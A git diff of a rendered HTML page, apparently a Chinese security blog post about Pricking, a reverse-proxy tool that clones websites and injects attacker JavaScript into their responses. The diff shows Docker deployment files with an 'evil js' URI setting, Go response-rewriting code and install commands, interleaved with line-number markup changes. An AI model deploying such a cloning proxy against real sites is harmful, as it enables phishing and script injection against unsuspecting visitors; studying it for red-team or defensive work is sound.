+</span></span><span style=display:flex><span>COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
+</span></span><span style=display:flex><span>COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
+</span></span><span style=display:flex><span>RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
+</span></span><span style=display:flex><span>ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
+</span></span></code></pre></td></tr></table></div></div><p>通过设置环境变量的值，就能完美克隆任意网站。</p><p>docker-entrypoint.sh :</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>echo <span style=color:#e6db74>&#34;[+] Replace evil js URI...&#34;</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>sed -e <span style=color:#e6db74>&#39;s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/&#39;</span> <span style=color:#ae81ff>\
@@ -169,7 +340,20 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Evil js URL :  </span>$PROXY_PASS_HOST<span style=color:#e6db74>/</span>$EVIL_JS_URI<span style=color:#e6db74>/static.js&#34;</span>
 </span></span><span style=display:flex><span>/usr/local/openresty/nginx/sbin/nginx -g <span style=color:#e6db74>&#34;daemon off;&#34;</span> -c /usr/local/openresty/nginx/conf/nginx.conf
-</span></span></code></pre></div><h3 id=nginx---docker-compose>Nginx - docker-compose</h3><p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yml data-lang=yml><span style=display:flex><span><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=nginx---docker-compose>Nginx - docker-compose</h3><p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yml data-lang=yml><span style=display:flex><span><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3&#39;</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>services</span>:
 </span></span><span style=display:flex><span>  <span style=color:#f92672>nginx</span>:
 </span></span><span style=display:flex><span>    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>rvn0xsy/pricking:v1</span>
@@ -182,7 +366,44 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span><span style=display:flex><span>      <span style=color:#f92672>PROXY_SOURCE_HOST</span>: <span style=color:#ae81ff>payloads.online</span>
 </span></span><span style=display:flex><span>      <span style=color:#f92672>NGINX_LISTEN_PORT</span>: <span style=color:#ae81ff>80</span>
 </span></span><span style=display:flex><span>      <span style=color:#f92672>EVIL_JS_URI</span>: <span style=color:#ae81ff>b026324c6904b2a9cb4b88d6d61c81d1</span>
-</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png alt=2021-02-16-17-40-24></p></p><p>日志：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b1008158-4f5f-11ec-b052-00d861bf4abb.png alt=2021-02-16-17-41-55></p></p><h2 id=0x03-golang实现---快速部署与完美克隆>0x03 Golang实现 - 快速部署与完美克隆</h2><p>通过Google搜索“Golang http reverse proxy”发现，官方在标准库中已经包含了实现反向代理的代码：<a href=https://pkg.go.dev/net/http/httputil#NewSingleHostReverseProxy>ReverseProxy</a></p><p>示例代码：<a href=https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/>Simple and Powerful ReverseProxy in Go</a></p><p>创建一个简单的反向代理服务器只需要少量的代码，而且还不需要处理HTTPS证书问题：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png alt=2021-02-16-17-40-24></p><p>日志：</p><p><img src=https://images.payloads.online/b1008158-4f5f-11ec-b052-00d861bf4abb.png alt=2021-02-16-17-41-55></p><h2 id=0x03-golang实现---快速部署与完美克隆>0x03 Golang实现 - 快速部署与完美克隆</h2><p>通过Google搜索“Golang http reverse proxy”发现，官方在标准库中已经包含了实现反向代理的代码：<a href=https://pkg.go.dev/net/http/httputil#NewSingleHostReverseProxy>ReverseProxy</a></p><p>示例代码：<a href=https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/>Simple and Powerful ReverseProxy in Go</a></p><p>创建一个简单的反向代理服务器只需要少量的代码，而且还不需要处理HTTPS证书问题：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
 </span></span><span style=display:flex><span> 
 </span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
 </span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;log&#34;</span>
@@ -219,8 +440,25 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>HandleFunc</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#a6e22e>ProxyRequestHandler</span>(<span style=color:#a6e22e>proxy</span>))
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ListenAndServe</span>(<span style=color:#e6db74>&#34;:8080&#34;</span>, <span style=color:#66d9ef>nil</span>))
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>我记得以前国内在Google被墙了后，出现了许多Google镜像网站，其实背后的原理也都是反向代理技术，只不过实现的语言不一样罢了。</p><h3 id=修改响应内容>修改响应内容</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>NewSingleHostReverseProxy</span>(<span style=color:#a6e22e>target</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>URL</span>) <span style=color:#f92672>*</span><span style=color:#a6e22e>ReverseProxy</span>
-</span></span></code></pre></div><p><code>httputil.NewSingleHostReverseProxy</code>用来初始化一个结构体代理对象，结构体内有以下几个属性：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>ReverseProxy</span> <span style=color:#66d9ef>struct</span> {
+</span></span></code></pre></td></tr></table></div></div><p>我记得以前国内在Google被墙了后，出现了许多Google镜像网站，其实背后的原理也都是反向代理技术，只不过实现的语言不一样罢了。</p><h3 id=修改响应内容>修改响应内容</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>NewSingleHostReverseProxy</span>(<span style=color:#a6e22e>target</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>URL</span>) <span style=color:#f92672>*</span><span style=color:#a6e22e>ReverseProxy</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>httputil.NewSingleHostReverseProxy</code>用来初始化一个结构体代理对象，结构体内有以下几个属性：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>ReverseProxy</span> <span style=color:#66d9ef>struct</span> {
 </span></span><span style=display:flex><span>	
 </span></span><span style=display:flex><span>	<span style=color:#a6e22e>Director</span> <span style=color:#66d9ef>func</span>(<span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>)
 </span></span><span style=display:flex><span>
@@ -236,9 +474,21 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#a6e22e>ErrorHandler</span> <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>, <span style=color:#66d9ef>error</span>)
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>其中<code>ModifyResponse</code>是用来修改Response的，Response中包含了响应头和响应内容。</p><p><a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L211">Pricking</a>的实现方式：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a6e22e>proxy</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>httputil</span>.<span style=color:#a6e22e>NewSingleHostReverseProxy</span>(<span style=color:#a6e22e>remote</span>)
+</span></span></code></pre></td></tr></table></div></div><p>其中<code>ModifyResponse</code>是用来修改Response的，Response中包含了响应头和响应内容。</p><p><a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%23js-repo-pjax-container%2C%20div%5Bitemtype%3D%22http%3A%2F%2Fschema.org%2FSoftwareSourceCode%22%5D%20main%2C%20%5Bdata-pjax-container%5D#L211">Pricking</a>的实现方式：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a6e22e>proxy</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>httputil</span>.<span style=color:#a6e22e>NewSingleHostReverseProxy</span>(<span style=color:#a6e22e>remote</span>)
 </span></span><span style=display:flex><span><span style=color:#a6e22e>proxy</span>.<span style=color:#a6e22e>ModifyResponse</span> = <span style=color:#a6e22e>handler</span>.<span style=color:#a6e22e>modifyResponse</span>
-</span></span></code></pre></div><p><code>handler.modifyResponse</code>中主要进行<a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%2523js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L81">对响应内容的处理</a>，比如注入js、修改响应头等操作。</p><p><code>modifyResponse</code>传入的是<code>http.Response</code>对象，如果要修改除<code>Header</code>以外的数据，需要对<code>Response.body</code>进行读取，修改完毕后，再重新赋值<code>Response.body</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>modifyResponse</span>(<span style=color:#a6e22e>w</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Response</span>)<span style=color:#66d9ef>error</span>{
+</span></span></code></pre></td></tr></table></div></div><p><code>handler.modifyResponse</code>中主要进行<a href="https://github.com/Rvn0xsy/Pricking/blob/c7871e86a5a6c0b37afca5d34a98c163ff04a418/runner/handler.go?_pjax=%2523js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L81">对响应内容的处理</a>，比如注入js、修改响应头等操作。</p><p><code>modifyResponse</code>传入的是<code>http.Response</code>对象，如果要修改除<code>Header</code>以外的数据，需要对<code>Response.body</code>进行读取，修改完毕后，再重新赋值<code>Response.body</code>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>modifyResponse</span>(<span style=color:#a6e22e>w</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Response</span>)<span style=color:#66d9ef>error</span>{
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>respBodyByte</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ioutil</span>.<span style=color:#a6e22e>ReadAll</span>(<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Body</span>)
 </span></span><span style=display:flex><span>    <span style=color:#75715e>// .....
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// 这里对Response进行修改
@@ -248,11 +498,32 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span><span style=display:flex><span>    <span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Body</span> = <span style=color:#a6e22e>ioutil</span>.<span style=color:#a6e22e>NopCloser</span>(<span style=color:#a6e22e>bytes</span>.<span style=color:#a6e22e>NewReader</span>(<span style=color:#a6e22e>respBodyByte</span>))
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h3 id=pricking-使用>Pricking 使用</h3><p>有Go语言环境 - 本地编译：</p><pre tabindex=0><code>$ git clone https://github.com/Rvn0xsy/Pricking
-$ cd Pricking
-$ make
-</code></pre><p>有Go语言环境 - Go Install：</p><pre tabindex=0><code>$ go install -v github.com/Rvn0xsy/Pricking/cmd/pricking@latest
